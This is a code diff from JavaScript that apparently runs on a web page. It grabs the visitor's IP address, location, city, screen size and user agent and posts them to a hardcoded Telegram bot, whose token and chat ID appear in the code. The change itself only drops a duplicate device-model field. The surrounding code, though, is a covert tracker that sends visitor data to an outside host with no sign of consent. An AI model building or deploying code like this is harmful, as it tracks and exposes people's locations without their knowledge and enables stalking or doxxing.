@@ -28,13 +28,11 @@ $.getJSON("https://api.ipify.org?format=json", function(data) {
         console.log(width + " " + height);
         const userAgent = navigator.userAgent;
         console.log(userAgent);
-        const deviceModel = navigator.userAgent;
-        console.log(deviceModel);
 
 
         var telegramApiUrl = "https://api.telegram.org/bot6936487434:AAHTB_vkcmvX8phb969ZpJhoUwoe5_Axnhw/sendMessage";
         var chatId = "1494753646";
-        var message = "New location: " + loc + ", " + city + ", IP: " + ip + "\n" + model + "\n"  + width + " " + height + "\n" + userAgent + "\n" + deviceModel;
+        var message = "New location: " + loc + ", " + city + ", IP: " + ip + "\n" + model + "\n"  + width + " " + height + "\n" + userAgent;
 
 
         fetch(telegramApiUrl, {
